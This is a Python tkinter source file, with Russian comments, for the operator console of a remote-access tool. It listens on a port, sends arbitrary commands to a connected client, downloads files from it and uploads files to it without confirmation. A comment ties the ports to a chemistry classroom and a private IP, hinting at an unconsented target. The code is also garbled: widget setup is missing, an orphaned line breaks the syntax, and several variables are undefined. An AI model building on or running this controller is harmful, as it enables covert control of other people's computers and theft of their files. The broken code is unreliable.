import socket
import os
import threading
import tkinter as tk
from tkinter import scrolledtext, messagebox
from datetime import datetime
import time
import queue


class RemoteServerGUI:
    def __init__(self, host='0.0.0.0', port=24968): #24968 - 2 скрипт  52968 - химичка          172.16.19.183
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.client_address = None
        self.is_running = False
        self.receive_thread = None
        self.data_queue = queue.Queue()
        self.download_mode = False
        self.download_file_obj = None
        self.download_filename = ""
        self.download_size = 0
        self.download_received = 0
        self.upload_mode = False
        self.upload_file_obj = None
        self.upload_size = 0
        self.upload_sent = 0

        # Создание главного окна
        self.root = tk.Tk()
        self.root.title(f"Remote Server Console - {host}:{port}")
        self.root.geometry("1000x600")

        # Создание виджетов
        self.create_widgets()

        # Запуск обработки очереди
        self.process_queue()

        # Запуск сервера
        self.start_server()

        self.progress_label = tk.Label(info_frame, text="", bg='lightgray', font=('Arial', 9))

        button_frame.pack(side=tk.RIGHT, padx=10, pady=5)

        self.reconn_btn.pack(side=tk.LEFT, padx=5)

                                  command=self.exit_app, bg='#dc3545', fg='white')
        self.exit_btn.pack(side=tk.LEFT, padx=5)

        # Область вывода консоли
        output_frame = tk.Frame(self.root)
        output_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        self.console_output = scrolledtext.ScrolledText(output_frame,
                                                        wrap=tk.WORD,
                                                        font=('Courier New', 10),
                                                        bg='black',
                                                        fg='lightgreen',
                                                        insertbackground='white')
        self.console_output.pack(fill=tk.BOTH, expand=True)

        # Нижняя панель для ввода команд
        input_frame = tk.Frame(self.root)
        input_frame.pack(fill=tk.X, padx=5, pady=5)

        prompt_label = tk.Label(input_frame, text=">", font=('Arial', 10))
        prompt_label.pack(side=tk.LEFT, padx=5)

        self.command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.command_entry.bind('<Return>', self.execute_command)

        self.console_output.tag_config('info', foreground='cyan')

        self.print_to_console("=== Remote Server Console ===", 'info')
        self.print_to_console(f"Сервер запущен на {self.host}:{self.port}", 'info')
        self.print_to_console("Ожидание подключения клиента...", 'info')

    def print_to_console(self, text, tag=None):
        """Вывод текста в консоль"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted_text = f"[{timestamp}] {text}\n"

        self.console_output.insert(tk.END, formatted_text, tag)
        self.console_output.see(tk.END)
        self.root.update_idletasks()

    def update_progress(self, current, total, operation="Скачивание", filename=""):
        """Обновление прогресса"""
        if total > 0:
            percent = (current / total) * 100
            progress_text = f"{operation}: {filename} {percent:.1f}% ({current}/{total} байт)"
            self.progress_label.config(text=progress_text)

            if current >= total:
                self.progress_label.config(text="")

    def process_queue(self):
        """Обработка очереди данных в основном потоке GUI"""
        try:
            while True:
                data = self.data_queue.get_nowait()

                if isinstance(data, tuple):
                    text, tag = data
                    self.print_to_console(text, tag)
                elif isinstance(data, bytes) and not self.download_mode:
                    # Текстовые данные от клиента
                    try:
                        text = data.decode('utf-8', errors='ignore')
                        if text.strip():
                            self.print_to_console(text, 'success')
                    except:
                        pass
                elif isinstance(data, bytes) and self.download_mode:
                    # Бинарные данные файла
                    if self.download_file_obj:
                        self.download_received += len(data)
                        self.download_file_obj.write(data)
                        self.update_progress(self.download_received, self.download_size,
                                             "Скачивание", os.path.basename(self.download_filename))

                        if self.download_received >= self.download_size:
                            self.download_file_obj.close()
                            self.download_mode = False
                            self.download_file_obj = None
                            self.print_to_console(f"[+] Файл {self.download_filename} успешно скачан", 'success')
                            self.update_progress(self.download_size, self.download_size,
                                                 "Скачивание", os.path.basename(self.download_filename))
                else:
                    self.print_to_console(str(data), 'info')

        except queue.Empty:
            pass
        finally:
            self.root.after(100, self.process_queue)

    def start_server(self):
        """Запуск сервера в отдельном потоке"""

        def server_thread():
            try:
                if self.server_socket:
                    try:
                        self.server_socket.close()
                    except:
                        pass

                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind((self.host, self.port))
                self.server_socket.listen(1)
                self.is_running = True

                # self.data_queue.put(("Сервер запущен, ожидание подключения...", 'info'))

                self.client_socket, self.client_address = self.server_socket.accept()
                self.client_socket.settimeout(0.5)

                self.data_queue.put(("-" * 50, 'info'))
                self.data_queue.put((f"[+] Клиент подключен: {self.client_address}", 'success'))
                self.data_queue.put(("-" * 50, 'info'))

                self.root.after(0, self.update_status,
                                f"Подключен")

                self.receive_thread = threading.Thread(target=self.receive_data_loop, daemon=True)
                self.receive_thread.start()

            except Exception as e:
                self.data_queue.put((f"[-] Ошибка сервера: {e}", 'error'))
                self.root.after(0, self.update_status, "Ошибка сервера")

        thread = threading.Thread(target=server_thread, daemon=True)
        thread.start()

    def receive_data_loop(self):
        """Цикл получения данных от клиента"""
        while self.is_running and self.client_socket:
            try:
                data = self.client_socket.recv(65536)
                if data:
                    self.data_queue.put(data)
                else:
                    self.data_queue.put(("[-] Клиент отключился", 'error'))
                    self.root.after(0, self.update_status, "Отключен")
                    break

            except socket.timeout:
                continue
            except Exception as e:
                self.data_queue.put((f"[-] Ошибка приема данных: {e}", 'error'))
                break

        self.cleanup_connection()

    def reconnect_server(self):
        """Переподключение сервера"""

        if messagebox.askyesno("Переподключение", "Переподключить сервер?"):
            self.root.after(0, self.update_status, "Переподключение")
            self.cleanup_connection()
            self.start_server()

    def cleanup_connection(self):
        """Очистка соединения"""
        self.is_running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
            self.client_socket = None
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
            self.server_socket = None
        self.client_address = None
        self.download_mode = False
        if self.download_file_obj:
            try:
                self.download_file_obj.close()
            except:
                pass
            self.download_file_obj = None

    def execute_command(self, event):
        """Выполнение команды"""
        command = self.command_entry.get().strip()

        if not command:
            return

        if not self.client_socket:
            self.print_to_console("[-] Клиент не подключен!", 'error')
            self.command_entry.delete(0, tk.END)
            return

        self.print_to_console(f"Выполнение: {command}", 'command')

        if command.lower() == 'exit':
            self.send_command('exit')
            self.print_to_console("[*] Завершение работы...", 'info')
            self.cleanup_connection()

        elif command.lower() == 'clear':
            self.clear_console()

        elif command.lower().startswith('get '):
            filename = command[4:].strip()
            if filename:
                self.download_file(filename)
            else:
                self.print_to_console("Использование: get <имя_файла>", 'error')

        elif command.lower().startswith('upload '):
            parts = command.split('"', maxsplit=4)
            if len(parts) == 5:
                self.upload_file(parts[1], parts[3])
            else:
                self.print_to_console("Использование: upload <локальный_файл> <удаленный_путь>", 'error')

        else:
            self.send_command(command)

        self.command_entry.delete(0, tk.END)
    def send_command(self, command):
        """Отправка команды клиенту"""
        try:
            self.client_socket.send(command.encode())
        except Exception as e:
            self.print_to_console(f"[-] Ошибка отправки команды: {e}", 'error')

    def download_file(self, filename):
        def download_thread():
            try:
                self.send_command(f'get {filename}')
                self.client_socket.settimeout(10)
                data = self.client_socket.recv(104857600)  # 100MB
                if data:
                    local_filename = os.path.basename(filename)
                    with open(local_filename, 'wb') as f:
                        f.write(data)
                    self.print_to_console(f"[+] Скачан {filename}", 'info')
            except Exception as e:
                self.print_to_console(f"[-] Ошибка: {e}", 'error')
        threading.Thread(target=download_thread, daemon=True).start()

    def upload_file(self, local_file, remote_path):
        """Загрузка файла на клиент (без подтверждения)"""

        def upload_thread():
            # try:
            if not os.path.exists(local_file):
                self.print_to_console(f"[-] Локальный файл {local_file} не найден", 'error')
                return

            file_size = os.path.getsize(local_file)
            file = local_file.split("\\")
            # print(file)
            # print(len(file))
            # print(file[len(file)-1])
            # Отправляем команду upload с размером файла
            self.send_command(f'upload "{os.path.join(remote_path, file[len(file)-1])}" "{file_size}"')
            self.print_to_console(f"[*] Начинаем загрузку: {local_file} ({file_size} байт)", 'info')

            with open(local_file, 'rb') as f:
                sent = 0
                while True:
                    data = f.read(4096)
                    if not data:
                        break
                    self.client_socket.send(data)
                    sent += len(data)
                    self.update_progress(sent, file_size, "Загрузка", os.path.basename(local_file))

            self.print_to_console(f"[+] Файл {local_file} успешно загружен как {remote_path}", 'success')
            self.update_progress(file_size, file_size, "Загрузка", os.path.basename(local_file))



        threading.Thread(target=upload_thread, daemon=True).start()

    def clear_console(self):
        """Очистка консоли"""
        self.console_output.delete(1.0, tk.END)
        self.print_to_console("=== Консоль очищена ===", 'info')

    def update_status(self, message):
        """Обновление статуса"""
        self.status_label.config(text=f"Статус: {message}")
        if self.client_address:
            self.client_label.config(text=f"Клиент: {self.client_address[0]}:{self.client_address[1]}")
        else:
            self.client_label.config(text="Клиент: Не подключен")

    def cleanup(self):
        """Очистка ресурсов"""
        self.is_running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        if self.download_file_obj:
            try:
                self.download_file_obj.close()
            except:
                pass
        self.print_to_console("[*] Соединение закрыто", 'info')

    def exit_app(self):
        """Выход из приложения"""
        if messagebox.askyesno("Выход", "Вы уверены, что хотите выйти?"):
            self.cleanup()
            self.root.quit()
            self.root.destroy()

    def run(self):
        """Запуск GUI приложения"""
        self.root.protocol("WM_DELETE_WINDOW", self.exit_app)
        self.root.mainloop()
